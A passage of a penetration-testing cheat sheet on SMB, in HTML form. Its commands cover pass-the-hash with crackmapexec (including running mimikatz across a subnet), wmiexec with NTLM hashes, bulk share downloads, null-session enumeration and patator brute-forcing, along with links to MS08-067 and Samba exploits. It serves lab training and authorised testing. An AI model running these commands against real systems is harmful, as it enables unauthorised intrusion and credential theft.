<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">guest</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nv">users</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">23</span>
<span class="nv">crackmapexec</span> <span class="nv">smb</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">Administrator</span> <span class="o">-</span><span class="nv">p</span> <span class="nv">P</span>@<span class="nv">ssw0rd</span>
<span class="nv">crackmapexec</span> <span class="nv">smb</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">Administrator</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">E52CAC67419A9A2238F10713B629B565</span>:<span class="mi">64</span><span class="nv">F12CDDAA88057E06A81B54E73B949B</span>
<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">Administrator</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">E52CAC67419A9A2238F10713B629B565</span>:<span class="mi">64</span><span class="nv">F12CDDAA88057E06A81B54E73B949B</span> <span class="o">-</span><span class="nv">M</span> <span class="nv">mimikatz</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">0</span><span class="o">/</span><span class="mi">24</span>
<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">Administrator</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">E52CAC67419A9A2238F10713B629B565</span>:<span class="mi">64</span><span class="nv">F12CDDAA88057E06A81B54E73B949B</span> <span class="o">-</span><span class="nv">x</span> <span class="nv">whoami</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">23</span>
<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">Administrator</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">E52CAC67419A9A2238F10713B629B565</span>:<span class="mi">64</span><span class="nv">F12CDDAA88057E06A81B54E73B949B</span> <span class="o">--</span><span class="k">exec</span><span class="o">-</span><span class="nv">method</span> <span class="nv">smbexec</span> <span class="o">-</span><span class="nv">x</span> <span class="nv">whoami</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">23</span> # <span class="nv">reliable</span> <span class="nv">pth</span> <span class="nv">code</span> <span class="nv">execution</span>
</pre></div></p>
<h3 id="smbexec">Smbexec<a class="headerlink" href="#smbexec" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
<h3 id="wmiexec">wmiexec<a class="headerlink" href="#wmiexec" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p>
<div class="codehilite"><pre><span></span> <span class="p">.</span><span class="o">/</span><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="o">&lt;</span><span class="n">ntlmhash</span><span class="o">&gt;</span> <span class="n">Administrator</span><span class="mf">@10.10.0.1</span>
</pre></div>

<h2 id="download-all">Download all<a class="headerlink" href="#download-all" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="o">#</span><span class="n">Download</span> <span class="k">all</span>
<span class="n">smbclient</span> <span class="o">//&lt;</span><span class="n">IP</span><span class="o">&gt;/&lt;</span><span class="k">share</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="n">recurse</span> <span class="k">ON</span>
<span class="o">&gt;</span> <span class="n">prompt</span> <span class="k">OFF</span>
<span class="o">&gt;</span> <span class="n">mget</span> <span class="o">*</span>
</pre></div>

<h2 id="kerberos-auth">Kerberos Auth<a class="headerlink" href="#kerberos-auth" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="c1">--kerberos //ws01win10.domain.com/C$</span>
<span class="n">rpcclient</span> <span class="o">-</span><span class="n">k</span> <span class="n">ws01win10</span><span class="p">.</span><span class="k">domain</span><span class="p">.</span><span class="n">com</span>
</pre></div>

<h2 id="mount-smb-share">Mount SMB share<a class="headerlink" href="#mount-smb-share" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="n">install</span> <span class="n">cifs</span><span class="o">-</span><span class="n">utils</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">mkdir</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="err">$</span><span class="n">shareName</span>
<span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">cifs</span> <span class="o">//</span><span class="err">$</span><span class="n">ip</span><span class="o">/</span><span class="err">$</span><span class="n">shareName</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="err">$</span><span class="n">shareName</span> <span class="o">-</span><span class="n">o</span> <span class="n">username</span><span class="o">=</span><span class="err">$</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="err">$</span><span class="n">password</span><span class="p">,</span><span class="k">domain</span><span class="o">=</span><span class="err">$</span><span class="k">domain</span>

<span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">auto</span> <span class="c1">--source //192.168.31.147/kathy --target /tmp/smb/ -o username=root,workgroup=WORKGROUP</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">cifs</span> <span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">134</span><span class="o">/</span><span class="n">backups</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="k">share</span> <span class="o">-</span><span class="n">o</span> <span class="k">user</span><span class="o">=</span><span class="p">,</span><span class="n">password</span><span class="o">=</span>
</pre></div></p>
<div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="n">X</span><span class="p">:</span> <span class="err">\\</span><span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span><span class="err">\</span><span class="o">&lt;</span><span class="n">sharename</span><span class="o">&gt;</span> <span class="o">/</span><span class="k">USER</span><span class="p">:</span><span class="o">&lt;</span><span class="k">domain</span><span class="o">&gt;</span><span class="err">\</span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">PERSISTENT</span><span class="p">:</span><span class="n">YES</span>
</pre></div>

<h2 id="null-session-enumeration">Null Session Enumeration<a class="headerlink" href="#null-session-enumeration" title="Permanent link">&para;</a></h2>
<p>Null Session Enumeration (enabled by default in SMB1)
<div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="err">\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="err">\</span><span class="n">ipc$</span> <span class="ss">&quot;&quot;</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="ss">&quot;&quot;</span>
<span class="n">net</span> <span class="k">view</span> <span class="err">\\</span><span class="n">ip_address</span>
</pre></div></p>
<div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;&quot;</span> <span class="n">ip</span> <span class="p">(</span><span class="n">give</span> <span class="n">empty</span> <span class="n">password</span><span class="p">)</span>
  <span class="o">&gt;</span> <span class="n">srvinfo</span>
  <span class="o">&gt;</span> <span class="n">enumdomusers</span>
  <span class="o">&gt;</span> <span class="n">getdompwinfo</span>
</pre></div>

<h2 id="use-uptime-to-guess-patch-level">Use UpTime to guess patch level<a class="headerlink" href="#use-uptime-to-guess-patch-level" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py">https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py</a></li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">FindSMB2UpTime</span><span class="p">.</span><span class="n">py</span> <span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">80</span><span class="p">.</span><span class="mi">10</span>
</pre></div>

<h2 id="enable-disable-status">Enable / Disable / Status<a class="headerlink" href="#enable-disable-status" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: <a href="https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and">https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and</a></p>
</blockquote>
<h3 id="windows-server-2012-r2-2016-powershell-methods">Windows Server 2012 R2 &amp; 2016: PowerShell methods<a class="headerlink" href="#windows-server-2012-r2-2016-powershell-methods" title="Permanent link">&para;</a></h3>
<h4 id="smb-v1">SMB v1<a class="headerlink" href="#smb-v1" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WindowsFeature</span> <span class="n">FS</span><span class="o">-</span><span class="n">SMB1</span></code></li>
<li>Disable: <code class="codehilite"><span class="n">Disable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">smb1protocol</span></code></li>
<li>Enable: <code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">smb1protocol</span></code></li>
</ul>
<h4 id="smb-v2v3">SMB v2/v3<a class="headerlink" href="#smb-v2v3" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
<h3 id="windows-81-and-windows-10-powershell-method">Windows 8.1 and Windows 10: PowerShell method<a class="headerlink" href="#windows-81-and-windows-10-powershell-method" title="Permanent link">&para;</a></h3>
<h4 id="smb-v1-protocol">SMB v1 Protocol<a class="headerlink" href="#smb-v1-protocol" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="err">–</span><span class="n">Online</span> <span class="err">–</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="n">Disable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
<li>Enable:   <code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">WindowsOptionalFeature</span> <span class="o">-</span><span class="n">Online</span> <span class="o">-</span><span class="n">FeatureName</span> <span class="n">SMB1Protocol</span></code></li>
</ul>
<h4 id="smb-v2v3-protocol">SMB v2/v3 Protocol<a class="headerlink" href="#smb-v2v3-protocol" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="err">–</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="err">–</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
<h3 id="windows-8-and-windows-server-2012">Windows 8 and Windows Server 2012<a class="headerlink" href="#windows-8-and-windows-server-2012" title="Permanent link">&para;</a></h3>
<h4 id="smb-v1-on-smb-server">SMB v1 on SMB Server<a class="headerlink" href="#smb-v1-on-smb-server" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB1Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB1Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB1Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
<h4 id="smb-v2v3-on-smb-server">SMB v2/v3 on SMB Server<a class="headerlink" href="#smb-v2v3-on-smb-server" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">|</span> <span class="k">Select</span> <span class="n">EnableSMB2Protocol</span></code></li>
<li>Disable:  <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">false</span></code></li>
<li>Enable:   <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">SmbServerConfiguration</span> <span class="o">-</span><span class="n">EnableSMB2Protocol</span> <span class="err">$</span><span class="k">true</span></code></li>
</ul>
<h3 id="windows-7-windows-server-2008-r2-windows-vista-and-windows-server-2008">Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008<a class="headerlink" href="#windows-7-windows-server-2008-r2-windows-vista-and-windows-server-2008" title="Permanent link">&para;</a></h3>
<h4 id="smb-v1-on-smb-server_1">SMB v1 on SMB Server<a class="headerlink" href="#smb-v1-on-smb-server_1" title="Permanent link">&para;</a></h4>
<p>Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned</p>
<ul>
<li>Detect: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Item</span> <span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span><span class="err">\</span><span class="n">LanmanServer</span><span class="err">\</span><span class="k">Parameters</span> <span class="o">|</span> <span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span><span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pspath</span><span class="err">}</span></code></li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB1</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">0</span> <span class="err">–</span><span class="k">Force</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB1</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">1</span> <span class="err">–</span><span class="k">Force</span></code></li>
</ul>
<h4 id="smb-v2v3-on-smb-server_1">SMB v2/v3 on SMB Server<a class="headerlink" href="#smb-v2v3-on-smb-server_1" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect: `Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | ForEach-Object {Get-ItemProperty $_.pspath}``</li>
<li>Disable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB2</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">0</span> <span class="err">–</span><span class="k">Force</span></code></li>
<li>Enable: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span> <span class="n">SMB2</span> <span class="o">-</span><span class="k">Type</span> <span class="n">DWORD</span> <span class="o">-</span><span class="n">Value</span> <span class="mi">1</span> <span class="err">–</span><span class="k">Force</span></code></li>
</ul>
<h3 id="disable-smb-client">Disable SMB Client<a class="headerlink" href="#disable-smb-client" title="Permanent link">&para;</a></h3>
<h4 id="smb-v1-on-smb-client">SMB v1 on SMB Client<a class="headerlink" href="#smb-v1-on-smb-client" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">lanmanworkstation</span></code></li>
<li>Disable:
<div class="codehilite"><pre><span></span><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">lanmanworkstation</span> <span class="n">depend</span><span class="o">=</span> <span class="n">bowser</span><span class="o">/</span><span class="n">mrxsmb20</span><span class="o">/</span><span class="n">nsi</span>
<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">mrxsmb10</span> <span class="k">start</span><span class="o">=</span> <span class="n">disabled</span>
</pre></div></li>
<li>Enable:
<div class="codehilite"><pre><span></span><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">lanmanworkstation</span> <span class="n">depend</span><span class="o">=</span> <span class="n">bowser</span><span class="o">/</span><span class="n">mrxsmb10</span><span class="o">/</span><span class="n">mrxsmb20</span><span class="o">/</span><span class="n">nsi</span>
<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">mrxsmb10</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span>
</pre></div></li>
</ul>
<h4 id="smb-v2v3-on-smb-client">SMB v2/v3 on SMB Client<a class="headerlink" href="#smb-v2v3-on-smb-client" title="Permanent link">&para;</a></h4>
<ul>
<li>Detect:   <code class="codehilite"><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">qc</span> <span class="n">lanmanworkstation</span></code></li>
<li>Disable:
<div class="codehilite"><pre><span></span><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">lanmanworkstation</span> <span class="n">depend</span><span class="o">=</span> <span class="n">bowser</span><span class="o">/</span><span class="n">mrxsmb10</span><span class="o">/</span><span class="n">nsi</span>
<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">mrxsmb20</span> <span class="k">start</span><span class="o">=</span> <span class="n">disabled</span>
</pre></div></li>
<li>Enable:
<div class="codehilite"><pre><span></span><span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">lanmanworkstation</span> <span class="n">depend</span><span class="o">=</span> <span class="n">bowser</span><span class="o">/</span><span class="n">mrxsmb10</span><span class="o">/</span><span class="n">mrxsmb20</span><span class="o">/</span><span class="n">nsi</span>
<span class="n">sc</span><span class="p">.</span><span class="n">exe</span> <span class="n">config</span> <span class="n">mrxsmb20</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span>
</pre></div></li>
</ul>
<h2 id="samba-configuration">Samba Configuration<a class="headerlink" href="#samba-configuration" title="Permanent link">&para;</a></h2>
<p>Configuration file</p>
<div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span>
<span class="n">smb</span><span class="p">.</span><span class="n">conf</span>
<span class="n">lmhosts</span>
</pre></div>

<p>Test &amp; reload configuration</p>
<div class="codehilite"><pre><span></span><span class="n">testparm</span> <span class="o">-</span><span class="n">v</span>
<span class="n">service</span> <span class="n">smb</span> <span class="k">restart</span>
</pre></div>

<p>User creation</p>
<div class="codehilite"><pre><span></span><span class="n">smbpasswd</span> <span class="o">-</span><span class="n">a</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span>
</pre></div>

<h2 id="samba-enumeration">Samba Enumeration<a class="headerlink" href="#samba-enumeration" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="c1"># Author: rewardone</span>
<span class="c1"># Description:</span>
<span class="c1">#  Requires root or enough permissions to use tcpdump</span>
<span class="c1">#  Will listen for the first 7 packets of a null login</span>
<span class="c1">#  and grab the SMB Version</span>
<span class="c1"># Notes:</span>
<span class="c1">#  Will sometimes not capture or will print multiple</span>
<span class="c1">#  lines. May need to run a second time for success.</span>

<span class="k">if</span> <span class="o">[</span> -z <span class="nv">$1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> <span class="s2">&quot;Usage: ./smbver.sh RHOST {RPORT}&quot;</span> <span class="o">&amp;&amp;</span> exit<span class="p">;</span> <span class="k">else</span> <span class="nv">rhost</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
<span class="k">if</span> <span class="o">[</span> ! -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> <span class="nv">rport</span><span class="o">=</span><span class="nv">$2</span><span class="p">;</span> <span class="k">else</span> <span class="nv">rport</span><span class="o">=</span><span class="m">139</span><span class="p">;</span> <span class="k">fi</span>

tcpdump -s0 -n -i tap0 src <span class="nv">$rhost</span> and port <span class="nv">$rport</span> -A -c <span class="m">7</span> <span class="m">2</span>&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&quot;samba\|s.a.m&quot;</span> <span class="p">|</span> tr -d <span class="s1">&#39;.&#39;</span> <span class="p">|</span> grep -oP <span class="s1">&#39;UnixSamba.*[0-9a-z]&#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> <span class="p">&amp;</span> <span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$rhost</span><span class="s2">: &quot;</span> <span class="p">&amp;</span>

<span class="nb">echo</span> <span class="s2">&quot;exit&quot;</span> <span class="p">|</span> smbclient -L <span class="nv">$rhost</span> <span class="m">1</span>&gt;/dev/null <span class="m">2</span>&gt;/dev/null
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span> <span class="o">&amp;&amp;</span> sleep .1
</pre></div>

<h2 id="pending-tools">Pending Tools<a class="headerlink" href="#pending-tools" title="Permanent link">&para;</a></h2>
<ul>
<li>SuperScan</li>
<li>Hyena</li>
<li>Winfingerprint</li>
<li>NetBIOS enumerator</li>
</ul>
<h2 id="netbios">NetBios<a class="headerlink" href="#netbios" title="Permanent link">&para;</a></h2>
<p><a href="https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput">https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput</a>
<a href="https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser">https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser</a></p>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=jUc1J31DNdw&amp;t=445s">https://www.youtube.com/watch?v=jUc1J31DNdw&amp;t=445s</a></li>
<li><a href="http://www.ubiqx.org/cifs/">Implementing CIFS - The Common Internet Filesystem - http://www.ubiqx.org/cifs/</a></li>
<li><a href="http://www.samba.org/samba/docs/using_samba/toc.html">Using Samba 2<sup>nd</sup> Edition - http://www.samba.org/samba/docs/using_samba/toc.html</a></li>
</ul>
<h2 id="vulnerabilities">Vulnerabilities<a class="headerlink" href="#vulnerabilities" title="Permanent link">&para;</a></h2>
<ul>
<li>Linux<ul>
<li>CVE-2007-2447 - Samba versions 3.0.20 through 3.0.25rc3<ul>
<li>When the "username map script" smb.conf option is enabled</li>
<li><a href="https://github.com/amriunix/cve-2007-2447">https://github.com/amriunix/cve-2007-2447</a></li>
<li><code class="codehilite"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span></code></li>
</ul>
</li>
</ul>
</li>
<li>Windows<ul>
<li>CVE-2008-4250 MS08-067 - Microsoft Server Service Relative Path Stack Corruption<ul>
<li>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta</li>
<li><a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py">https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py</a></li>
<li><a href="https://vulners.com/exploitdb/EDB-ID:6824">https://vulners.com/exploitdb/EDB-ID:6824</a></li>
<li><code class="codehilite"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms08_067_netapi</span></code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="bruteforcing">Bruteforcing<a class="headerlink" href="#bruteforcing" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">patator</span> <span class="n">smb_login</span> <span class="k">host</span><span class="o">=</span><span class="mi">10</span><span class="p">.</span><span class="mi">121</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">33</span> <span class="k">domain</span><span class="o">=</span><span class="n">CONTOSO</span> <span class="k">user</span><span class="o">=</span><span class="n">COMBO00</span> <span class="n">password</span><span class="o">=</span><span class="n">COMBO01</span> <span class="mi">0</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">lab</span><span class="o">-</span><span class="n">net2019</span><span class="o">/</span><span class="n">combo</span><span class="o">-</span><span class="n">creds</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">l</span> <span class="n">smb_brute</span>

<span class="n">patator</span> <span class="n">smb_login</span> <span class="k">host</span><span class="o">=</span><span class="n">FILE0</span> <span class="k">domain</span><span class="o">=</span><span class="n">CONTOSO</span><span class="p">.</span><span class="k">LOCAL</span> <span class="k">user</span><span class="o">=</span><span class="n">COMBO10</span> <span class="n">password</span><span class="o">=</span><span class="n">COMBO11</span> <span class="mi">0</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">lab</span><span class="o">-</span><span class="n">net2019</span><span class="o">/</span><span class="n">smb</span><span class="o">-</span><span class="k">open</span><span class="p">.</span><span class="n">txt</span> <span class="mi">1</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">lab</span><span class="o">-</span><span class="n">net2019</span><span class="o">/</span><span class="n">combo</span><span class="o">-</span><span class="n">creds</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">x</span> <span class="k">ignore</span><span class="p">:</span><span class="n">fgrep</span><span class="o">=</span><span class="err">”</span><span class="n">STATUS_LOGON_FAILURE</span><span class="err">”</span>

<span class="err">–</span><span class="n">timeout</span> <span class="mi">100</span> <span class="err">–</span><span class="n">threads</span><span class="o">=</span><span class="mi">2</span> <span class="err">–</span><span class="n">rate</span><span class="o">-</span><span class="k">limit</span><span class="o">=</span><span class="mi">2</span> 
</pre></div>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../SIP-5060/" title="SIP 5060" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                SIP 5060
              </span>
            </div>
          </a>
        
        
          <a href="../SMTP-25/" title="SMTP 25" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                SMTP 25
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
